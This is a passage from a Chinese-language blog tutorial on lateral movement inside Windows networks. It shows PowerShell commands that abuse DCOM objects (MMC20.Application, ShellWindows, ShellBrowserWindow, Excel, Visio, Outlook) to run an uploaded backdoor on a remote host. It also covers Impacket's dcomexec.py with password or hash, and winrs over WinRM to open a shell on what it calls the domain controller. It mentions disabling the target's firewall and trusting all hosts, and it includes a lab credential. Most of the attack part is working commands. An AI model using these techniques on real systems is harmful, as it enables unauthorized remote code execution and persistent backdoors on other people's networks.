style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>shell powershell Get-WmiObject -Namespace ROOT\\CIMV2 -Class Win32_DCOMApplication | findstr &quot;MMC&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>MMC Application Class（MMC20.Application）是一种编程接口，用于创建、管理和定制Microsoft Management Console（MMC）控制台。它提供了对MMC功能的编程访问，允许开发人员创建自定义的Snap-In、扩展控制台功能，并实现对控制台的编程操作和交互</p><p>执行以下命令来加载一个MMC对象的COM实例（我们只需要提供一个DCOM ProgID和一个IP地址，就返回一个COM对象的实例）</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$com</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> = [activator]::CreateInstance([type]::GetTypeFromProgID(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;MMC20.Application&quot;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">,</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;127.0.0.1&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">))</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div></li></ul><p>​ 获取该对象后，我们可以调用该实例查看能够执行的方法和属性</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span># 此时可执行如下命令获得&quot;MMC20.Application&quot;支持的操作</span></span>
<span class="line"><span>$com.Document.ActiveView | Get-Member</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/dc-dcom-mmc-local.png" alt="dc-dcom-mmc-local" tabindex="0" loading="lazy"><figcaption>dc-dcom-mmc-local</figcaption></figure><p>能够看到该实例具有执行任意命令的方法，通过调用该方法在本地执行命令</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$com</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.Document.ActiveView.ExecuteShellCommand(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&#39;cmd.exe&#39;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">,$null,</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;/c calc.exe&quot;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">,</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;Minimized&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#启动一个计算器，Minimized用于指定窗口的大小参数</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/dcom-local-test-dc-calc.png" alt="dcom-local-test-dc-calc" tabindex="0" loading="lazy"><figcaption>dcom-local-test-dc-calc</figcaption></figure><p>如上图本地调用执行程序成功</p><ul><li>其他可以利用的程序</li></ul><p>​ ShellWindows、ShellBrowserWindow、Excel.Application以及Outlook.Application等</p><h3 id="远程dcom执行命令" tabindex="-1"><a class="header-anchor" href="#远程dcom执行命令"><span>远程DCOM执行命令</span></a></h3><p>在实例化一个对象时，我们提供了程序的ID一个实例化的IP，我们可以修改选项为远程主机来达到在远程主机上实例化对象的目的，并调用该实例化的对象执行命令</p><p>利用条件</p><ul><li>具有管理员权限的Powershell</li><li>目标系统的防火墙对我方放行，或直接利用系统服务关闭对方的防火墙</li><li>在远程主机上执行命令时，必须使用域管的administrator账户或者目标主机具有管理员权限的账户</li></ul><p>利用步骤</p><ul><li>通过IPC连接目标主机或是在可控主机上搭建SMB服务器的方式上传恶意木马文件(木马文件要在目标主机的可执行目录下)<img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/Dcom-upload.png" alt="Dcom-upload" loading="lazy"></li></ul><p>在共享文件夹中上传了名为Dcom.exe的后门程序</p><ul><li>通过powershell实现与远程主机Dcom的交互，并创建MMC20.Application的实例</li></ul><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#实例化对象，目标为远程主机</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$com</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> = [activator]::CreateInstance([type]::GetTypeFromProgID(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;MMC20.Application&quot;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">,</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;192.168.30.10&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">))</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#在远程主机上执行exe程序</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$com</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.Document.ActiveView.ExecuteShellCommand(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;cmd.exe&quot;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">,$null,</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;/c c:Dcom.exe&quot;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">,</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;Minimized&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#完整命令</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">powershell</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $com</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [activator]::CreateInstance([type]::GetTypeFromProgID(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;MMC20.Application&quot;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">,</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;192.168.30.10&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)).Document.ActiveView.ExecuteShellCommand(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&#39;cmd.exe&#39;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">,$null,</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;/c C:\\Dcom.exe&quot;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">,</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;Minimized&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/remote-dc-dcom.png" alt="remote-dc-dcom" tabindex="0" loading="lazy"><figcaption>remote-dc-dcom</figcaption></figure><p>成功返回shell</p><h4 id="调用shellwindows远程执行命令" tabindex="-1"><a class="header-anchor" href="#调用shellwindows远程执行命令"><span>调用ShellWindows远程执行命令</span></a></h4><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/shellwindows-id.png" alt="shellwindows-id" tabindex="0" loading="lazy"><figcaption>shellwindows-id</figcaption></figure><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[Activator]::CreateInstance([Type]::GetTypeFromCLSID(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">,</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;192.168.30.10&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">))</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">.item</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">().Document.Application.ShellExecute(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;cmd.exe&quot;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">,</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;/c C:\\shell.exe&quot;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">,</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;c:\\windows\\system32&quot;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">,$null,0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/dcom-shellwindows.png" alt="dcom-shellwindows" tabindex="0" loading="lazy"><figcaption>dcom-shellwindows</figcaption></figure><h4 id="调用excel-application远程执行命令" tabindex="-1"><a class="header-anchor" href="#调用excel-application远程执行命令"><span>调用Excel.Application远程执行命令</span></a></h4><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 通过PowerShell与DCOM进行远程交互，创建Excel.Application对象的实例:</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$com</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> = [activator]::CreateInstance([type]::GetTypeFromprogID(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;Excel.Application&quot;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">,</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;192.168.30.10&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">))</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#禁用警告和提示信息</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$com</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.DisplayAlerts = </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$false</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 然后执行如下命令，我们就可以调用该对象的&quot;DDEInitiate&quot;方法在远程主机上启动进程:</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$com</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.DDEInitiate(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;cmd.exe&quot;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">,</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;/c C:\\excel.exe&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="shellbrowserwindow" tabindex="-1"><a class="header-anchor" href="#shellbrowserwindow"><span>ShellBrowserWindow</span></a></h4><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/shellbrowserwindow.png" alt="shellbrowserwindow" tabindex="0" loading="lazy"><figcaption>shellbrowserwindow</figcaption></figure><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$com</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> = [activator]::CreateInstance([type]::GetTypeFromCLSID(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;C08AFD90-F2A1-11D1-8455-00A0C91F3880&quot;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">,</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;127.0.0.1&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">))</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$com</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.Documen.Application | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Get-Member</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/shellbrowsewindow-method.png" alt="shellbrowsewindow-method" tabindex="0" loading="lazy"><figcaption>shellbrowsewindow-method</figcaption></figure><p>调用方法为ShellExecute</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#完整命令</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[activator]::CreateInstance([type]::GetTypeFromCLSID(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;C08AFD90-F2A1-11D1-8455-00A0C91F3880&quot;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">,</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;192.168.30.10&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)).Document.Application.shellExecute(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;C:\\shell.exe&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/shellbrowerwindows-exe.png" alt="shellbrowerwindows-exe" tabindex="0" loading="lazy"><figcaption>shellbrowerwindows-exe</figcaption></figure><h4 id="visio-application" tabindex="-1"><a class="header-anchor" href="#visio-application"><span>Visio.Application</span></a></h4><p>使用条件：目标主机安装了Visio</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[activator]::CreateInstance([type]::GetTypeFromProgID(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;Visio.Application&quot;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">,</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;192.168.30.10&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)).[0].Document.Application.shellExecute(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;C:\\shell.exe&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h4 id="outlook-application" tabindex="-1"><a class="header-anchor" href="#outlook-application"><span>Outlook.Application</span></a></h4><p>使用条件：目标主机安装了Outlook</p><p>通过Outlook创建Shell.Application对象来实现命令行执行：</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[activator]::CreateInstance([type]::GetTypeFromProgID(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;Outlook.Application&quot;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">,</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;192.168.52.138&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)).createObject(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;Shell.Application&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">).shellExecute(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;C:\\shell.exe&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h4 id="impacket中的dcomexec-py脚本" tabindex="-1"><a class="header-anchor" href="#impacket中的dcomexec-py脚本"><span>Impacket中的dcomexec.py脚本</span></a></h4><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>python dcomexec.py domain/username:password@ip &lt;command&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>用于获取一个半交互式的shell</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/dcomexec-py.png" alt="dcomexec-py" tabindex="0" loading="lazy"><figcaption>dcomexec-py</figcaption></figure><p>需要提供目标机器上为管理员用户的账号密码</p><p>支持使用hash来代替明文密码</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>python dcomexec.py domain/username:@ip -hashes</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="winrm" tabindex="-1"><a class="header-anchor" href="#winrm"><span>WinRM</span></a></h2><p>WinRM(Windows Remote Management)是 Microsoft 对 WS-Management 协议的实现，WS-Management 协议即一种基于标准简单对象访问协议（soap）的防火墙友好协议，它让来自不同供应商的硬件和操作系统能够相互操作。windows 众多可以远程执行命令方式中的一种。</p><p>作为DCOM和WMI远程管理的替代方法，WinRM用于通过WSMan与远程计算机建立会话，WSMan利用HTTP/S作为传输机制来传递XML格式的消息。在现代Windows系统中，WinRM HTTP通过TCP端口5985进行通信，而HTTPS（TLS）通过TCP端口5986进行通信。</p><h3 id="利用条件-2" tabindex="-1"><a class="header-anchor" href="#利用条件-2"><span>利用条件</span></a></h3><p>WinRS 适用于 Win server 2008 / Win7 及以后的系统，但是 Win server 2008 / PC 全版本系统默认关闭。</p><p>只有在Win server 2012 之后的版本的WinRM服务才默认启动并监听了5985端口，允许远程任意主机来管理。</p><p>执行以下命令，查询本机的WinRM状态</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">powershell</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Get-WmiObject</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -Class</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> win32_service</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Where-Object</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> {</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">$_</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">.name</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -like</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;WinRM&quot;}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/win2012-running.png" alt="win2012-running" tabindex="0" loading="lazy"><figcaption>win2012-running</figcaption></figure><p>执行以下命令，开启WinRM服务</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">winrm</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> quickconfig</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -q</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"> #这条命令运行后会自动添加防火墙例外规则，放行5985端口。</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#Enable-PSRemoting -Force</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>查看winrm具体配置</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>winrm get winrm/config</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/pc-winrm-config.png" alt="pc-winrm-config" tabindex="0" loading="lazy"><figcaption>pc-winrm-config</figcaption></figure><p>允许所有客户端连接IP</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#cmd</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">winrm</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> winrm/config/Client</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> @{TrustedHosts=&quot;*&quot;}#添加信任列表操作</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">winrm</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> e</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> winrm/config/listener</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"> #查看监听地址和端口</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#powershell</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Set-Item</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> WSMan:localhsot</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\c</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">lient</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\t</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">rustedhosts</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -value</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> *</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="通过winrm执行远程命令" tabindex="-1"><a class="header-anchor" href="#通过winrm执行远程命令"><span>通过WinRM执行远程命令</span></a></h3><p>Windows远程管理工具提供了两个命令行工具用于远程管理</p><ul><li>Winrs，允许远程执行命令的命令行工具，利用WS-Management协议</li><li>Winrm(Winrm.cmd),内置系统管理命令行工具，允许管理员配置本机的WinRM服务</li></ul><p>1.winrs</p><p>执行以下命令，在远程主机上执行命令( 需要提供可用的用户凭据),并且双方都开启Winrm通信(需要位于信任列表中)</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>winrs -r:http://192.168.30.10:5985 -u:Administrator -p:uu2fu3o@admin &quot;whoami&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/winrs-pc-whoami.png" alt="winrs-pc-whoami" tabindex="0" loading="lazy"><figcaption>winrs-pc-whoami</figcaption></figure><p>执行以下命令，利用winrs获取一个交互式shell</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>winrs -r:http://192.168.30.10:5985 -u:Administrator -p:uu2fu3o@admin &quot;cmd&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/winrs-pc-get-dc-shell.png" alt="winrs-pc-get-dc-shell" tabindex="0" loading="lazy"><figcaption>winrs-pc-get-dc-shell</figcaption></figure><p>2.winrm</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" 